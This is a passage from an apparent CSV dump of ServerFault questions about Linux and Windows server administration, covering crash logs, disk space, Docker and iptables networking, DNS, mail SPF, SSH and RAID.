@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
Apr  1 12:41:10 b2 kernel: microcode: microcode updated early to revision 0x29, date = 2013-06-12
Apr  1 12:41:10 b2 kernel: Initializing cgroup subsys cpuset
Apr  1 12:41:10 b2 kernel: Initializing cgroup subsys cpu
Apr  1 12:41:10 b2 kernel: Initializing cgroup subsys cpuacct
Apr  1 12:41:10 b2 kernel: Linux version 3.10.0-693.21.1.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC) ) #1 SMP Wed Mar 7 19:03:37 UTC 2018
Apr  1 12:41:10 b2 kernel: Command line: BOOT_IMAGE=/vmlinuz-3.10.0-693.21.1.el7.x86_64 root=/dev/mapper/centos-root ro crashkernel=auto rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet LANG=en_US.UTF-8
Apr  1 12:41:10 b2 kernel: e820: BIOS-provided physical RAM map:
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009ffff] usable
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000000100000-0x000000001fffffff] usable
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000020000000-0x00000000201fffff] reserved
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000020200000-0x000000003fffffff] usable
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000040000000-0x00000000401fffff] reserved
Apr  1 12:41:10 b2 kernel: BIOS-e820: [mem 0x0000000040200000-0x00000000cabd3fff] usable
</code></pre>
","<centos><logging><centos7><memory><server-crashes>","2019-04-01 09:57:18"
"838696","git reports ""No space left on device"", but df -h says there is is 2.5G available","<p>I have an EC2 node running Ubuntu 14.04. On a deploy this morning, I received the following error message from git fetch:</p>

<pre><code>error: unable to create temporary file: No space left on device
</code></pre>

<p>I logged into the server and df -h indicates I have plenty of space:</p>

<pre><code>$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            492M   12K  492M   1% /dev
tmpfs           100M  488K   99M   1% /run
/dev/xvda1      7.8G  4.9G  2.5G  67% /
none            4.0K     0  4.0K   0% /sys/fs/cgroup
none            5.0M     0  5.0M   0% /run/lock
none            497M  4.0K  497M   1% /run/shm
none            100M     0  100M   0% /run/user
</code></pre>

<p>Am I misreading df here? My understanding has been that /tmp on EC2 is resident on /dev/xvda1, but maybe I'm wrong?</p>
","<ubuntu><amazon-ec2><hard-drive><tmp>","2017-03-16 15:55:31"
"909919","`sudo apt-get -f install` fails everytime","<p>This command <code>sudo apt-get -f install</code> fails every time I try to run it.</p>

<p><a href=""https://i.sstatic.net/gSy72.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/gSy72.png"" alt=""enter image description here""></a></p>
","<linux><apt><sudo>","2018-04-29 21:08:48"
"961235","Freebsd 11 custom installer memstick with packages","<p>I use freebsd 11 memstick installer image always but need some packages if I install freebsd 11 then I should install some packages
( phpmyadmin, php7, nginx, mysql, nano) and enabled root ssh vb process</p>

<p>I dont want reagain this process </p>

<p>Can I create customize memstick installer ? </p>

<p>I want include package phpmyadmin, php7, nginx, mysql, nano and change some properties system file on FreeBSD 11 memstick image</p>

<p>how can I do this ? </p>

<p>can u help me ? thank u for help</p>
","<installation><freebsd><shell><automated-install>","2019-04-03 06:25:50"
"910207","Whitelisting/blacklisting using BIND","<p>So I'm researching possible ways of limiting internet access in a school network. Comparing multiple options and concluding which option is the best in a certain environment. So far I have an idea of how to do: Firewall(PFSense), using specific browser (Safe Exam Browser), using ACL's on a router. But my teacher is really hellbent on me using DNS whitelisting/blacklisting as well.<br></p>

<p>This would be based on a BIND DNS server and probably making use of dnsmasq. Which if I understand correctly just allows me to edit my /etc/hosts file and put all the ""annoying"" sites in there so that they get translated to a false IP (0.0.0.0). <br> </p>

<p>Now My question here is, how do I whitelist? How do I make a list of sites which I want to be translated by an external DNS and block all the others? Because so far I have not found a clear explanation as to how to do this.</p>
","<domain-name-system><security><bind>","2018-05-01 18:42:40"
"1029631","Case statement not working properly in shell script","<p>The case statement in the bash script does not work. Below is the snippet of my shell script.</p>
<pre><code>usage=&quot;Usage: \n servicer [ service argument ] {-h}\n&quot;
invalid=&quot;\n not a valid option\n&quot;
argument=&quot;\n Please use -h option for help\n&quot;

while getopts &quot;:h:s&quot; option
        do
                case &quot;${option}&quot; in
                        s ) service=$OPTARG;;
                        h ) echo -e $usage
                           exit 0
                        ;;
                        * ) echo -e $invalid
                           exit 1
                        ;;
                esac
        done
</code></pre>
<p>So whenever i run my script with -h or -s option the flow goes to the last * option.</p>
","<bash><shell-scripting>","2020-08-11 04:50:09"
"910320","Windows 10, Virtualbox and Ubuntu VLANs","<p>I have a laptop with Windows 10 and a Realtek PCIe GBE Family Controller. My NIC is connected to a switch in trunk mode (traffic for 2 VLANs transiting via this connection).</p>

<p>I would like to setup the VLANs on an Ubuntu Linux VM on Virtual Box.</p>

<p>First, I created two VLANs on Windows via the Realtek diagnostic utility.</p>

<p>The Ubuntu VM will act as a DHCP server for the two VLANs (everything is set up with isc-dhcp-server). I also did all the necessary configuration on Ubuntu for the VLANs i.e. creating the VLANs, configuring IP addresses etc...</p>

<p>On Virtual Box, I only have one virtual adapter configured in bridged mode and using the Realtek NIC.</p>

<p>When I run Wireshark on Ubuntu to capture traffic, I don't see any incoming traffic for the VLANs.</p>

<p>Any idea what is wrong?</p>
","<ubuntu><vlan><virtualbox><windows-10>","2018-05-02 10:43:51"
"1029706","Aliasing Server Name in SSH Command","<p>This may be trivial, but I am not sure how do it safely and optimally.</p>
<p>I have a few servers (AWS EC2) into which I ssh from the bash. Those server names are long.</p>
<p>How can I alias them, so instead of typing the long thing, I can type something like</p>
<p><code>ssh ubuntu@&lt;alias-name&gt;</code></p>
","<ubuntu><bash><alias><bashrc>","2020-08-11 14:58:30"
"1029748","Do I need a SWAP partition?","<p>I am going to remake a server with Ubuntu 20.04</p>
<p>It will have 6 GB of RAM, a 20 GB SSD for the operating system, and a 100 GB SSD for data.</p>
<p>Should we make a SWAP partition ?</p>
<p>If so, how many GB are needed ?</p>
<p>Thank you</p>
","<linux><ubuntu><memory><partition><swap>","2020-08-11 21:50:57"
"1029757","SPF and DKIM for one domain on two servers","<p>I followed <a href=""https://www.linuxbabe.com/mail-server/setting-up-dkim-and-spf"" rel=""nofollow noreferrer"">this guide</a> to setup SPF and DKIM for emails to be sent from a server for a domain. That server is the location of the actual email server for the domain.</p>
<p>I now want to setup another server to be able to send emails from the domain via PHP. Can anyone suggest how this is done? Is it the exact same steps?</p>
","<email><email-server><spf><dkim><opendkim>","2020-08-12 00:17:03"
"839300","Restricting WIFI AP access to AP's IP address only","<p>I have an ubuntu system with a USB wifi dongle set up as both an AP and Client and it's routing my internet connection. I followed the instructions at <a href=""http://imti.co/post/145442415333/raspberry-pi-3-wifi-station-ap"" rel=""nofollow noreferrer"">http://imti.co/post/145442415333/raspberry-pi-3-wifi-station-ap</a> and it seems to be working well.</p>

<p>What I'm trying to figure out how to do is restrict devices connected to the AP to only the AP's IP of 192.168.50.1 I do not want the user of the AP to have any internet access. </p>

<p>The goal is that someone can connect to the AP and access a configuration web page to configure the wifi client.</p>

<p>So far the only rule added to iptables is:</p>

<pre><code>iptables -t nat -A POSTROUTING -s 192.168.50.0/24 ! -d 192.168.50.0/24 -j MASQUERADE
</code></pre>

<p>I'm not even sure what to call this process at this point, so any help would be greatly appreciated.</p>
","<ubuntu><iptables><routing><wifi><access-point>","2017-03-19 23:13:08"
"961576","SSH ""lag"" in LAN on some machines, mixed distros","<p>I've had a strange problem with SSH connections inside my LAN for a few months. It only happens when I'm using my Windows 10 device to connect to a (barebone) linux machine.</p>

<p>When I connect to a SSH server it's like my input is only sent once every second. If I hold a key, it doesn't print anything for a second and after that second I see every keystroke I did during that time.</p>

<p>This is how it looks on the working servers:
<img src=""https://pictshare.net/uy2ncj.gif"" alt=""""></p>

<p>This is how it looks on the ones with the issue:
<img src=""https://pictshare.net/4d1p27.gif"" alt=""""></p>

<p>Things I have tested/found out</p>

<ul>
<li>Changing the ""UseDNS"" setting in /etc/sshd doesn't fix it</li>
<li>It happens with bash (and zsh) on Debian (OpenSSH_7.4p1 Debian-10+deb9u6, OpenSSL 1.0.2r  26 Feb 2019) and Ash on Alpine Linux (OpenSSH_7.9p1, OpenSSL 1.1.1b  26 Feb 2019)</li>
<li>It doesn't happen on Alpine Linux OpenSSH_7.7p1, LibreSSL 2.7.4</li>
<li>It doesn't happen with every machine, just some (not depending on the distro)</li>
<li>resolv.conf is correct</li>
<li>Error happens with and without ClientAliveInterval (tested on client and server)</li>
<li>Pinging the devices is always fast (less than 1 ms) so it's only SSH</li>
<li>It also lags when I ssh from the linux subsystem on Windows 10 and with Putty and with MobaXterm</li>
<li>No problems when I connect from Linux instead of Windows</li>
</ul>

<p>Does anyone have any clues or things I could try?
Thanks</p>
","<linux><ssh><windows-10><putty><lag>","2019-04-04 19:32:59"
"1029882","How to move a website to a new server?","<p>I am going to move my website to a new server.</p>
<p>I need to copy the <code>/var/www</code> directory to the new server.</p>
<p>Should I use SCP or RSYNC ?</p>
","<ubuntu><rsync><directory><ubuntu-18.04><scp>","2020-08-12 20:51:51"
"961659","How can I set up a local mail server and forward external email to another?","<p>I would like to set up an email server, using Redhat 7.6, let's call it <code>mail.domain.tld</code>. The box is realm-joined to that domain. I want to create email addresses for domain users, for example <code>fred@mail.domain.tld</code>, (note that I do want the <code>mail</code> hostname to be there, because <code>fred@domain.tld</code> is already in use by the domain).</p>

<p>I want this server to handle all email for domain users, and forward any emails that are bound for other domains (Gmail for example) to a separate email server, let's call it <code>big-mail.domain.tld</code>. This separate server already exists and is configured.</p>

<p>I wish the emails themselves to be stored on <code>mail.domain.tld</code>, and users can access them remotely from other boxes with Thunderbird via imap and smtp.</p>

<p>Is such an arrangement even possible? Is it possible using Postfix and Dovecot? I have been trying to follow many tutorials, but I am unfamiliar with the exact terminology to look for, and my use case seems to be somewhat unusual. This is the way I want it to work, because <code>big-mail.domain.tld</code> is not under my control, nor is the Active Directory domain controller itself.</p>

<p>EDIT: I forgot to say, I want the users to be able to authenticate with the mail server using their domain credentials.</p>
","<email><postfix><redhat><email-server><dovecot>","2019-04-05 08:58:59"
"910713","How does UDP sockets know which source address to respond to?","<p>I have understood that UDP sockets are fully identified by destination IP and destination port. The IPs are in the IP datagram´s header yes, but when the datagram arrive at its destination, only the payload is sent to the upper-layer protocol.
If two hosts send a UDP segment to a host with the same IP and port, how does the socket know which IP to send the response to, since the payload does not contain the source IP and the socket isn´t identified with source IP?</p>
","<socket><udp>","2018-05-04 10:18:10"
"910782","Windows Server 2016 Remote Access and other Roles","<p>This question actually is 2 questions. I am in the middle of setting up my company's server and network. I have a host running Hyper V. I only have a standard license of Windows Server 2016 so that only allows me 2 VMs(can't purchase more). The plan is to have a DC(AD,DHCP,DNS), File Server, VPN, print server, mysql database server(won't be for another year for the database). Here are my questions:</p>

<ol>
<li>I'm wondering what your recommendations are on what roles to install on each windows server. The MySQL will end up being on a Linux VM so I don't have to worry about that. But in other words, should I put the DC and Remote Access role on 1 server with the File/Printer Server on the other VM? Or should the File Server be on the DC vm? Or maybe the File Server and Remote Access on one with the DC by itself?</li>
<li>I'm still new to active directory and wondering how to setup my VPN situation. The 3 owners at my company have laptops that they use as their main machine for work and when they want to work at home. They come to work every day. How would you set this up on their machines?(they are their own personal machines as well). Do I setup the domain account on their laptops? Or do they just use their local accounts and are always using the VPN connection with they are away or at work?</li>
</ol>

<p>I appreciate any advice or extra tips that you may have that I haven't mentioned about setting up a server(I'm suppose to be a software developer for the company, but have to wear the IT hat as well).</p>

<p>If there is any info that I haven't provided, let me know! Thanks!</p>
","<active-directory><vpn><windows-server-2012><remote-access><windows-server-2016>","2018-05-04 17:59:16"
"910907","Does virtual machine consume ram when its turned off","<p>I have a virtual box virtal machine on windows 7 i installed windows xp on it and i set it to use 2gb of ram and my pc has 4gb of ram so i wonder does it use my ram when the machine is off</p>
","<virtual-machines>","2018-05-05 21:09:26"
"910927","Raspberry pi error looking for libd|.so","<p>I rebooted my raspberry pi and then attempted to run <code>docker ps</code> but got this crazy error:</p>

<p><code>
docker: error while loading shared libraries: libd|.so.0: cannot open shared object file: No such file or directory
</code></p>

<p>Note the library name: libd + pipe character.  No idea what happened here and whether it was some kind of memory corruption and looking for libd, but reinstalling docker and rebooting it fixed the problem (kind of wish I hadn't reinstalled docker since I think the fix was just reboot).  I had no luck at all googling for this error, but I'm not sure if that is because special characters are harder to google for.</p>

<p>Does anybody have any insight into what might have caused this problem?</p>
","<docker>","2018-05-06 03:47:27"
"911014","Docker containers cannot access published ports on host IP","<p>I have two containers running on a docker bridge network (this can be the default <code>docker0</code>, or a user-defined bridge). If I publish ports from one container, the other container cannot access those published ports via the host IP address.</p>

<p>Example:</p>

<pre><code>$ docker run --detach -p 80:80 nginx
$ docker run --rm -it centos \
  /bin/bash -c ""yum install -y wget &amp;&amp; wget http://${HOST_IP}""
...
Connecting to ${HOST_IP}:80... failed: No route to host.
</code></pre>

<p>In the above example, the nginx server can be accessed from the host and other servers on the network (or internet). However, the centos docker container, which has full network access, is unable to connect to port 80 on the  host. All  ports on the host can be accessed without issue, as long as it is not on a docker network bridge.</p>

<p>I have found completely disabling firewalls (firewalld and iptables) and restarting the docker service allows access, so I am reasonably certain this is a firewall issue. I found <a href=""https://github.com/docker/libnetwork/pull/1963"" rel=""nofollow noreferrer"">this docker libnetwork PR</a>, but it hasn't seen any activity in 6 months.</p>

<p>Am I missing something fundamental about docker here? Shouldn't two containers on the same bridge network be able to communicate over a publish port? I should add that if I try to access the nginx port directly using the internal private network IP (172.X.X.X) from inside the centos container then it works. It is only when connecting out to the published host port.</p>

<p>I have found the above happens with both the latest centos (7.4.1708) and fedora (28) images.</p>
","<centos><iptables><docker><fedora><firewalld>","2018-05-07 04:01:24"
"962036","most efficient way to block an ip address from connecting to a ubuntu 18.04 server","<p>Since i do not have access to other layers, i would like to know the most efficient way to block an ip address from connecting to a Ubuntu 18.04 server. To the box itself, they are most likely connecting to port 80. However i would like to block access across all ports to this ip address.</p>

<p>I am aware of adding a record in iptables. By most efficient i mean, the least amount of layers the packet goes through. Kind of like blocking using iptables happens before block using an apache config on the webserver itself.</p>

<p>Are there any other better ways?</p>

<p>Thanks</p>
","<linux><ubuntu><ip><tcp><ip-address>","2019-04-08 14:39:15"
"962081","how to remove centos 7 gui?","<p>Recently I installed centos 7 with GUI. <br>now I want to remove that GUI like was I hadn't chosen that? because I need more space on my disk.
<br>I tried many times but I failed. could anyone please help me?</p>

<p>Thanks in advance</p>
","<centos><centos7><graphical-user-interface>","2019-04-08 20:03:44"
"911132","How to have minimum Email Downtime when switching web host?","<p>I have my domain and hosting in godaddy. My emails are in Google mail.
I want to switch to Bluehost.</p>

<p>I assume my MX records needs to change...right?</p>

<p>If yes, how do I ensure there is minimum downtime for my emails.</p>

<p>I want my emails to remain in Google mail.</p>

<p>Please let me know.</p>
","<domain-name-system><email><domain><migration>","2018-05-07 17:59:29"
"1029912","Bash Script terminates when shell terminal is closed","<p>I'm able to successfully run the script below from a terminal in ubuntu 14.04.  However, when I close the terminal the vlc process also terminates which I don't want.  I've tried using &quot;&amp;&quot; so that it runs in the background, but to no avail (script.sh &amp;).  Any suggestions on how to run the script below so that if the terminal is closed, the vlc process does not terminate?  Any suggestions would be appreciated.</p>
<pre><code>#!/bin/bash
vlc --extraintf telnet localhost 4212 --vlm-conf /home/test/Videos/temp.vlm
</code></pre>
","<linux><ubuntu><bash><terminal>","2020-08-13 04:28:55"
"1029927","2 NICs, same IP, only one connected at a time","<p>My Linux, Ubuntu 18.04 machine has 2 NICs, One is in use, the other is disconnected.</p>
<p>I want to switch from one to the other, with absolutely minimal downtime.</p>
<p>Can I assign identical IPs to both then just pull out the cable from one and stick it in the other?</p>
","<linux><ubuntu><networking>","2020-08-13 07:21:38"
"911204","Is it necessary for the production server(CentOS 7) to start the tuned service?","<p>we hava  a large number of production servers running CentOS 7 with tuned service。
Is it really necessary keeping tuned running？
Or we could  initialize the system configuration file such as sysctl.conf  by vm image or kickstart file</p>
","<linux><centos7>","2018-05-08 07:11:51"
"1030019","DNS query sends NS response for NAPTR query instead of going for SRV and A query","<p>I am trying to send dns query with NAPTR+SRV+A query but after NAPTR query it dns send NAPTR response with NS response and with additional records that is SRV and A but I want to send SRV and A query exclusively.</p>
","<linux><domain-name-system><nameserver><dns-zone><response-time>","2020-08-13 18:07:00"
"962409","How exactly the network bandwidth is calculated and in which layer of OSI Model?","<p>We can see everyday our bandwidth is calculated by ISP's , Mobile Telecoms and Cloud Services.<br>
But how exactly they calculate this bandwidth?<br>
<strong>Do they count number of tcp/udp packets in layer 4?</strong>
If so, do they ignore icmp packets?</p>
","<networking><cloud><bandwidth><isp>","2019-04-10 12:08:22"
"962523","Block URL with path in /etc/hosts?","<p>I am working on OSX and I want to block access to an individual URL (a twitter profile) in <code>/etc/hosts</code>.</p>

<p>Is this possible? I've tried adding:</p>

<pre><code>127.0.0.1      twitter.com/mypath
127.0.0.1      www.twitter.com/mypath
</code></pre>

<p>and then running <code>sudo dscacheutil -flushcache</code>, but it doesn't seem to do anything, I can still see the page.</p>
","<hosts>","2019-04-10 21:39:19"
"1030204","SSH to machines on same domain without typing fqdn","<p>I use to be able to ssh to my other machines by simply typing <code>ssh server1</code> instead of <code>ssh server1.example.com</code>. Now I get an error <code>SSH: Could not resolve hostname server1: Temporary failure in name resolution</code>. The same error occurs when I ping the short name.</p>
<p>My computers:</p>
<ul>
<li>Home computer: home.example.com running Ubuntu 20.04</li>
<li>Server 1 (runs nameserver, web host): server1.example.com</li>
<li>Server 2 (runs nameserver 2): server2.example.com</li>
</ul>
<p>There are a few others, but you get the gist.</p>
<p>My home computer has it's DNS set to use the IP for server1 and server2.</p>
<p>My question, why am I no longer able to ssh/ping short name?</p>
<p>What do I need to adjust to set this back up?</p>
<p>Note: I have never altered the <code>~/.ssh/config</code> file, so I don't believe the solution requires editing it.</p>
","<domain-name-system><ssh>","2020-08-15 03:19:36"
"1030215","Getting ERR_CONNECTION_REFUSED after changing nameserver for a domain","<p>Hello everyone I have a website which was hosted in digital ocean server and now i changed it to AWS. After changing the nameserver, when i access the domain i get error saying <a href=""http://www.mydomain.com"" rel=""nofollow noreferrer"">www.mydomain.com</a> refused to connect. ERR_CONNECTION_REFUSED. Is it normal to get this error after changing Nameserver? I did research on aftereffect of changing nameserver and came to know about domain propagation. So is this the error message i get when its in propagation state? Or problem could be something else?</p>
<p>I checked the domain in intodns.com and it shows record of new nameservers and IP ie AWS, but when i check with dig NS mydomain.com it show old IP and nameservers ie digital ocean.</p>
<p>Any idea what might be causing this? Solutions?</p>
","<domain-name-system><nameserver><domain-name>","2020-08-15 06:09:49"
"962541","How can I allow ssh tunneling/forwarding trough a machine without giving access to the intermediate machine","<p>Lets say i have a machine with a few virtual machines on them, how would i forward ssh connections to those virtual machines without giving access to the host machine? Is it possible to do so with only a single port exposed to the outside world? This would also apply to a machine, with some other machines behind it.</p>

<p>I would like to do the redirect based on which keys are used, or perhaps based on a flag set in the ssh command on the client.</p>
","<networking><ssh><ssh-tunnel><forwarding>","2019-04-11 00:18:02"
"962574","Can't visit server on some port from other machine in the same intranet","<p>The Service is working on the server.<br>
The server starts a service on port 9001. It's working on the localhost. Service can be visited through the browser.  </p>

<p>The firewall is disabled.</p>

<pre><code>$sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

$ sudo ufw status
Status: inactive

$ service iptables status
Unit iptables.service could not be found.
</code></pre>

<p>The network is working.<br>
Other machine can get <code>ping</code> result. But <code>telnet</code> would fail with<code>connection refused</code>. And other machince also disabled their firewall.</p>

<p>The server it's using unbuntu 18.04 x86_64.<br>
What could be done to fix this situation?</p>
","<ubuntu><networking>","2019-04-11 08:58:47"
"1030277","Downgarde CentOS 7+ to CentOS 6","<p>I've been doing some research and most of forum I've read so far say that there's no way to go down from 7 or 8 to version 6.
I did follow a guide and they said this notice:</p>
<p>Note: The following steps will only work for downgrades within the same major version (such as from RHEL/CentOS 7.6 to 7.5) but not between major versions (such as from RHEL/CentOS 7.0 to 6.9).</p>
<p>regards</p>
","<ubuntu><centos><ssh><redhat>","2020-08-15 21:55:20"
"962671","How to output one number few times with spaces in one line via bash","<p>How to output one number few times with spaces in one line via bash</p>

<p>I have</p>

<pre><code>a=5
b=10
</code></pre>

<p>I should output 5 times number 10 with using of variables and with spaces
Also, i should capture this in variable</p>

<p>For example, i have to receive this</p>

<p><code>10 10 10 10 10</code></p>

<p>And it should be variable, it can be array.
But after <code>echo $c</code>, i should receive <code>10 10 10 10 10</code></p>

<p>How to do it ? </p>
","<bash><scripting><shell><shell-scripting>","2019-04-11 20:26:33"
"1030380","Webserver setup, port forwarding seems to be happening and don't know why","<pre><code>[me@myserver myDir]# wget http://127.0.0.1
--2020-08-17 10:45:45--  http://127.0.0.1/
Connecting to 172.31.2.21:8080... connected.
Proxy request sent, awaiting response... 200 OK
</code></pre>
<p>Why is my request being forwarded to port 8080, and what is doing the forwarding</p>
<pre><code>[me@myserver myDir]# netstat -tulpn | grep :80
tcp        0      0 172.31.2.121:80         0.0.0.0:*               LISTEN      5643/httpd
</code></pre>
<p>And iptables :</p>
<pre><code>[me@myserver mydir]# iptables -S
-P INPUT DROP
-P FORWARD DROP
-P OUTPUT DROP
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -s 127.0.0.0/8 -j DROP
-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m state --state NEW -m tcp --dport 25 -j ACCEPT
-A INPUT -p tcp -m state --state NEW -m tcp --dport 161:162 -j ACCEPT
-A INPUT -p udp -m udp --dport 161:162 -j ACCEPT
-A INPUT -p udp -m udp --dport 323 -j ACCEPT
-A INPUT -j REJECT --reject-with icmp-host-prohibited
-A FORWARD -j REJECT --reject-with icmp-host-prohibited
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 123 -j ACCEPT
-A OUTPUT -p udp -m udp --sport 161:162 -j ACCEPT
-A OUTPUT -d 10.0.0.0/8 -p tcp -j ACCEPT
-A OUTPUT -d 172.0.0.0/8 -p tcp -j ACCEPT
-A OUTPUT -j ACCEPT
</code></pre>
<p>Its a fresh install of apache http server, no redirects setup</p>
","<linux><web-server><apache2>","2020-08-17 02:49:50"
"962691","Bonding / link aggregation, is it ok to connect 2 switches together?","<p>I have 2 computers, each with 2 ethernet ports connected to 2 unmanaged switches using linux Bonding Mode: load balancing (round-robin). Can the 2 switches connect to each other without causing a problem? </p>

<p>It seems to operate fine and things work better when I artificially create some failures, but I wonder if it will cause some problem I don't notice.</p>
","<networking><linux-networking><switch><bonding>","2019-04-12 00:09:11"
"962705","nginx: [emerg] bind() to ip:3000 failed (99: Cannot assign requested address)","<p>I want running my server(nodejs) without server name. Only running on my ip address. Here is my config file:</p>

<p>/etc/nginx/sites-available/server.com.conf</p>

<pre><code>server {
    listen xx.xx.xx.xx:3000 default_server;

    location / {
        proxy_set_header   X-Forwarded-For $remote_addr;
        proxy_set_header   Host $http_host;
        proxy_pass         ""http://xx.xx.xx.xx:3000"";
    }
}
</code></pre>

<p>When I restart nginx and see status I get this error:</p>

<p>nginx: [emerg] bind() to ip:3000 failed (99: Cannot assign requested address)</p>

<p>Where is my wrong? Please help me</p>
","<linux><nginx><centos>","2019-04-12 03:05:53"
"1030429","Find with regex not working on CentOS 7","<p>I have problem with find and regular expression. I would like to find files in /etc, which name begin of a or b. I tried this commands:</p>
<pre><code>find /etc -type f -regex '^a'
find /etc -regextype sed -regex &quot;^a&quot;
find /etc -regextype egrep -regex '^a'
find /etc -regextype posix-egrep -regex '^a'
</code></pre>
<p>But not working. I have 20 files in /etc which name begin of a, but my regexp not find this files. What i do wrong?</p>
<p>Regards Paweł</p>
","<centos><find><regular-expressions>","2020-08-17 11:33:22"
"1030516","Correct Way to Install Node.js in a Multiuser Server?","<p>I have to acknowledge being an old timer U*ix system administrator. Software to be used by everybody had two possible locations:</p>
<p>/usr/bin
/usr/local/bin</p>
<p>The best example is gcc and family.</p>
<p>Now I find myself in a new world. My node installation lives in:</p>
<p>/home/david/.nvm/versions/node/v14.7.0/bin/node</p>
<p>So I added the corresponding directory to my path.</p>
<p>How/where should the node package be installed? It would be done and owned by root, of course.</p>
","<linux><web-hosting><node.js><javascript>","2020-08-17 22:29:55"
"962887","Is there a way to setup ping check for remote host in Azure?","<p>I'm trying to find a way in Azure to setup some service to be able to do ping check on remote host not hosted in Azure and alert when it is not reachable. For example On-Premises server with PIP. </p>
","<azure><ping><healthcheck><alert>","2019-04-13 06:48:23"
"962921","Got 3 HP Proliant DL365 G1 for really, really cheap. Can I run Hyper-v or ESXI?","<p>Title. I got them for really cheap, including the rack, and I was thinking of setting them to virtualize stuff for home use and for some labs. 
First I tried to install Windows Server 2019 (I have MSDN Subscription so licenses are ok), got an error. Then Every single image (Windows Servers from 2003 to 2019, Ubuntu Server latest, EXSI from 5.5 and upwards) I tried to boot up from,  getting the same error (Ilegal Opcode).</p>

<p>Since these servers are really old, do any of you remember what can I run? Do I need to do special stuff that a guy like me with only PCs have never done?</p>
","<virtualization><hp-proliant>","2019-04-13 16:18:50"
"911928","How to run pt-kill on CentOS Server","<p>So, I have downloaded pt-kill file with:</p>

<pre><code>wget percona.com/get/pt-kill
</code></pre>

<p>Now, I tried running it, but everything is not working? How do you run this file?</p>
","<centos><mysql><percona>","2018-05-12 17:13:50"
"962984","Convert server 2012 R2 to Windows 10","<p>I have a server machine, with regular desktop hardware that I have obtained from my company. It is currently running Windows Server 2012 R2. The intention is to use it as a media server, connected to a TV.
It works well, but the server OS is very heavy and slow to boot, also not 100% compatible with some of the applications I want to run on it, so I would like to install standard Windows 10 on it.
Does anyone know if the server license will work for Windows 10, and which version of Windows 10 (home/pro/enterprise) I could install?</p>
","<windows-server-2012-r2><windows-10><licensing>","2019-04-14 12:20:24"
"911986","SPF softfail even when set seemingly correctly","<p>I have my own postfix server, that serves only as a forwarding mail server, i.e. if you send email at admin@mydomain.com, it will arrive into my gmail/whatever else.</p>

<p>My SPF looks as such:</p>

<pre><code>v=spf1 ip4:&lt;IP HERE&gt; a:&lt;DOMAIN HERE&gt; include:_spf.google.com -all
</code></pre>

<p>I have verified that when I'm sending emails, they come from ip in the <code>ip4</code> part:</p>

<pre><code>Received-SPF: SoftFail (protection.outlook.com: domain of transitioning
gmail.com discourages use of &lt;SAME_IP_AS_IN_SPF&gt; as permitted sender)
Received: from &lt;DOMAIN_FROM_SPF&gt; (&lt;IP_FROM_SPF&gt;) by ...
</code></pre>

<p>Gmail won't even put the email into junk - it just never appears in my mailbox anywhere. Their <a href=""https://toolbox.googleapps.com/apps/checkmx/check?domain"" rel=""nofollow noreferrer"">tool</a> though marks SPF as ok (though I assume that tool is if I want to relay to the gmail server and they'll send it for me - is the <code>include:_spf.google.com</code> useless in my case? I just want to forward emails from people to my personal address).</p>

<p>In outlook then, the mail is marked as junk. Any idea of what's wrong both with SPF and marking the mail as junk? I also have reverse dns so that my hostname can be resolved to the same ip as above. According to this <a href=""http://www.kitterman.com/spf/validate.html"" rel=""nofollow noreferrer"">SPF tester</a> tool, my SPF should pass as well.</p>
","<postfix><spf><rhel7>","2018-05-13 09:18:49"
"963053","What's the best RAID array for fault tolerance","<p>When setting up a server, I was told it needs to have really good fault tolerance. What RAID array would give me the best fault tolerance?</p>
","<raid>","2019-04-15 03:59:54"
